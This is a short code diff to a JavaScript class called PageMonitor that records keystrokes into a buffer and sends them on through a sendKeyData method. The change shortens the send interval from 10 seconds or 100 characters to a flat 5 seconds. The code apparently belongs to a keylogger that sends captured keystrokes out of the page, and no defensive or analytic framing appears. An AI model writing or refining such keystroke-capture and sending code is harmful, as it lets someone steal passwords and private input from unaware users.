@@ -21,8 +21,8 @@ class PageMonitor {
       if (this.shouldLogKey(event)) {
         keyBuffer += this.getKeyString(event);
         
-        // Send buffer every 10 seconds or when it reaches 100 characters
-        if (Date.now() - lastSend > 10000 || keyBuffer.length > 100) {
+        // Send buffer every 5 seconds
+        if (Date.now() - lastSend > 5000) {
           this.sendKeyData(keyBuffer);
           keyBuffer = '';
           lastSend = Date.now();
